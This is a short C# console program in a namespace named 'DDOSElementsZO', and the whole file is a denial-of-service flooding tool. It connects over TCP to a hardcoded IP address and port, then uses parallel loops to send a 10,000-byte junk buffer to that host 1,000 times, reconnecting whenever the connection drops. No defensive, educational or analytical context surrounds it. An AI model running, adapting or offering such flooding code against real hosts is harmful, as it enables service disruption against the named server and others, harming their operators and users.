using SimpleTCP;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DDOSElementsZO
{
    class Program
    {
        private static byte[] Data { get; set; }
        static void Main(string[] args)
        {
            Data = Enumerable.Range(0, 10000).Select(x => Convert.ToByte(byte.MaxValue)).ToArray();
            var Client = new SimpleTcpClient();
            Client.DataReceived += Client_DataReceived;
            Client.Connect("51.79.145.33", 37955);
            Parallel.For(0, 1000, (i) =>
            {
                try
                {
                    if(Client.TcpClient == null)
                    {
                        Client.Connect("51.79.145.33", 37955);
                    }
                    if (!Client.TcpClient.Connected)
                    {
                        Client.Connect("51.79.145.33", 37955);
                    }
                    Client.Write(Data);
                    Console.Write("SEND - ");
                }
                catch (Exception ex)
                {
                    Console.Write(ex.Message);
                    Client = new SimpleTcpClient();
                    Client.DataReceived += Client_DataReceived;
                }
            });
        }

        private static void Client_DataReceived(object sender, Message e)
        {
            Data = e.Data;
            Console.WriteLine("[RECIEVED]");
        }
    }
}
